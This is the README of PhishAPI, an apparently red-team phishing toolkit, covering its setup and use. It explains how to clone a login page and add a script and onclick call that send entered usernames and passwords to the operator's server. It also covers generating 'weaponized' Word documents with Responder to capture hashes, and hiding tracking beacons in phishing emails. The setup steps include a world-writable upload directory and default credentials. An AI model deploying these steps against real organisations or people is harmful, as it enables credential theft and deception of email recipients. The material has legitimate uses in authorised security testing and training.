# To Setup (Ubuntu/Debian) :

1) It's all in Docker now! Clone this repo (`git clone https://github.com/curtbraz/PhishAPI.git`), and `cd PhishAPI`. I typically host on an AWS EC2 Ubuntu instance or on WSL2 locally on Win 10 but you can host it anywhere. Be sure to open up ports TCP/80, 443, 445, & 137-139 to the Internet.

2) Install docker-compose on Ubuntu with `sudo apt-get install docker-compose -y` and start Docker with `sudo systemctl start docker`.

3) For HTTPS (RECOMMENDED!), replace the certificate and key (keeping the filenames the same) in `/certs/ssl/` with yours (LetsEncrypt?) and update the domain (ServerName) in `000-default-le-ssl.conf`. Otherwise, skip this step but browsers will warn against POSTing to insecure sites and web push notifications won't work.

4) Run docker-compose via `docker-compose build` from within the PhishAPI directory. Then, `docker-compose up -d`. (`docker-compose down` will kill it)

5) Visit your URL and configure your settings for notifications first. The Default User/Pass for basic auth is PhishAPI:PhishAPI for the config and reporting pages but I recommend changing this by editing `.htpasswd`. You should be good to go! (By default the web server listens on HTTP/80 and HTTPS/443)

OR, Copy and Paste the Following in Ubuntu: (skip the certbot and "cp" steps if you don't have a cert ready yet)


```
sudo apt-get update
sudo apt-get install docker-compose letsencrypt git -y
git clone https://github.com/curtbraz/PhishAPI.git
cd PhishAPI
```

Skip this step if you don't have your certs yet.

```
certbot certonly --standalone
cp `find /etc/letsencrypt/live/ -name cert.pem` certs/ssl/crt/phishapi.crt
cp `find /etc/letsencrypt/live/ -name privkey.pem` certs/ssl/key/phishapi.key
```

Then

```
sudo systemctl start docker
sudo docker-compose build
sudo docker-compose up -d
```

Finally, if you only want to allowlist yourself while you obtain the certs (highly recommended), edit PhishAPI/html/index.php and change Line 31 to YOUR workstation's public IP address, not the IP of the server. Then comment out Line 32. Otherwise, leave it as-is and it will only block the denylist by default.

## OR

<b>If you don't wish to use a pre-populated landing page template or one doesn't exist that you would like to use, feel free to create or clone your own.  Simply : </b><br><br>

1) Add the external script source in the `<head>` element

	`<script src="https://YOUR_PHISHAPI_URL.com/APICredentialFormSubmit.js"></script>`

2) Change or add an "onclick" attribute to the submit button for the login form and fill out the arguments

	`<button onclick="SubForm('PhishAPI_URL_HERE','NAME/ID_OF_LOGIN_FORM','PROJECT_NAME','SLACK_BOT_NAME','SLACK_EMOJI','USER_FIELD_NAME/ID','PASS_FIELD_NAME/ID','SOURCE_URL_HERE','CSRF_TOKEN_HERE')">Submit!</button>`
	
	PhishAPI_URL_HERE = https://YOUR_PHISHAPI_URL.com (wherever you're hosting the API)<br />
	NAME/ID_OF_LOGIN_FORM = Whatever the cloned `<form name="">` is set to for the page you cloned<br />
	PROJECT_NAME = Self explanatory. The name of the org/client you're targeting (ex. Walmart)<br />
	SLACK_BOT_NAME = I use "PhishBot"<br />
	SLACK_EMOJI = I use `:fishing_pole_and_fish:`<br />
	USER_FIELD_NAME/ID = Name or ID of the username/email field (ID Preferred) (`<input name="username">` or `<input id="user">`)<br />
	PASS_FIELD_NAME/ID = Name or ID of the password field (ID Preferred) (`<input name="password">` or `<input id="pass">`)<br />
	SOURCE_URL_HERE = Original Address You Cloned the Site From (ex. https://TARGET_URL.com/logon.html)<br />
	CSRF_TOKEN_HERE = Leave blank unless the site you're cloning has a CSRF token.  If so provide the Name/ID here (`<input type="hidden" name="csrf_token" value="XDLKJSDLKJLDKJDLKJFSLKLSF">` so "csrf_token" is what you would use)

4) Sit back and wait for the Slack bot to notify you.  When you want to see the credentials visit https://YOUR-API-HERE/results using your basic auth credentials or click the link in the Slack notification.<br><br>

# 2) To Use the API for Generating Word Doc Payloads :

1) Create `/var/www/uploads` Path and `sudo chmod 777 /var/www/uploads -R` the path

3) Browse out to your hosted API (YOUR_URL.com) and select "Weaponized Documents" to generate your DOCX

4) Optionally set up [Responder](https://github.com/SpiderLabs/Responder "Responder") in a background process and run `phishinghashes.sh` every minute or so with cron

5) Set up your php.ini to allow uploads of at least 15MB and enable browscap.ini for parsing UserAgent strings, otherwise some functionality may be limited.  

6) Email your doc and wait for the Slack alerts!

# 3) To Use the API to Store and Generate Email Campaign Templates : 

Leverage a template by creating or choosing an existing template from the local repository, or, you can compose a blank email and embed the invisible HTML beacon to be notified when the recipient opens their email.

<br />
<p align="center">
<img src="https://i.imgur.com/AmwZbbF.png"><br />
<b>Figure 1: Existing, New, or No Campaign Choices</b>
</p>


If a new campaign is chosen, you can create variables for dynamic re-use in the future and store them as HTML templates in a database.  The WYSIWYG editor makes things simple, but you can also copy and paste from a text editor or another source if you'd like!

<br />
<p align="center">
<img src="https://i.imgur.com/COHaq6q.png"><br />
<b>Figure 2: New Campaign w/ Variables & Images</b>
</p>


Next time, choosing the existing template will dynamically provide input fields for the stored variables.  They can be applied in real time using JavaScript to update the email body.  Checking the "Embed Notification for Opened Email" box will automatically append invisible code to your template that will alert you when your recipient opens their email.  (Images must be allowed to render for this to work)

Sit back and watch as your target opens their email and cross your fingers you later recieve another alert for BeEF, Maldocs, or your captured credentials!
